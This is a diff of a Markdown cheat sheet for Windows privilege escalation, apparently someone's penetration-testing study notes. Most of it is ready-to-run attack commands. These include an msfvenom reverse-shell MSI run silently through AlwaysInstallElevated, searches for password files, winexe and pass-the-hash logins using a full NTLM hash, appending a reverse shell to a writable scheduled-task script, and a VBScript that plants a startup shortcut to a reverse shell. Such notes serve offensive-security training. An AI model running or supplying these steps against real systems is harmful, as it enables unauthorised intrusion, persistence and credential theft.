@@ -104,10 +104,11 @@
  check if both values are 1.\
  0. `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\
  1. `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`\ 
- 2. or ` reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- 3. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >reverse.msi`  (create a payload) 
- 4. Transfer payload to Temp and execute
- 5. `msiexec /quiet  /qn /i "C:\Windows\Temp\reverse.msi"`
+ 2. or ` reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated and 
+ 3. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+ 4. `msfvenom -p window/shell_reverse_tcp LHOST=MyIP LPORT=LISTENINGPORT -f msi >reverse.msi`  (create a payload) 
+ 5. Transfer payload to Temp and execute
+ 6. `msiexec /quiet  /qn /i "C:\Windows\Temp\reverse.msi"`
 
 
  ### SeImpersonatePrivilege 
@@ -139,7 +140,6 @@
 3. ` dir /s *pass* == *.config`  and ` findstr /si password *.xml *.ini *.txt`
 4.  `winexe -U 'admin%password123' //TARGETIP cmd.exe`
 
-
 ### SAM (Security Account Manager)
 
 1. `.\winPEASany.exe quiet cmd searchfast filesinfo`
@@ -149,8 +149,40 @@
 5.   `hashcat -m 1000 --force NTLMHASH(2ndpart) /usr/share/wordlists/rockyou.txt` and then use `winexe`.
 6.   Or without cracking the hash-> pass the hash
 7.   `pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da(ENTIREHASH)' //TARGETIP cmd.exe`
-8.   
 
+
+### Scheduled Tasks
+1. Check directories that we have not seen
+2. `schtasks /query /fo LIST /v` OR Powershell 
+3.  `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1 ` access check  if we can write
+4.  start a netcat listener
+5.  `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1` copy our revershell location to script
+
+### Insecure GUI Apps (Some older version)
+
+### Startup Apps 
+1. `.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` check permissions on the StartUp directory eg (BUILTIN\Users group)
+2. create a vb script eg CreatShortCut.vbs in kali and transfer. (Change path accordingly)
+```
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
+Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+
+```
+3. `cscript CreateShortcut.vbs` run the script 
+4. Start a listener on Kali, then log in as the admin user to trigger the exploit
+
+### Exploit Installed Application 
+1.  `tasklist /v` Manually Enumerate all the task list or automatically by the following programs
+2.   `.\seatbelt.exe NonstandardProcesses `
+3.  ` .\winPEASany.exe quiet procesinfo`  
+4.  If you find an interesting process, identify the ***version*** by running `<SERVICENAME> /?` or `<SERVICENAME> -h' or text files and config.
+5.  Go to Exploit DB https://www.exploit-db.com/?type=local&platform=windows  and see if there are any.
+
+### Token Impersonation 
 
 ## File Transfer to Linux 
 0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
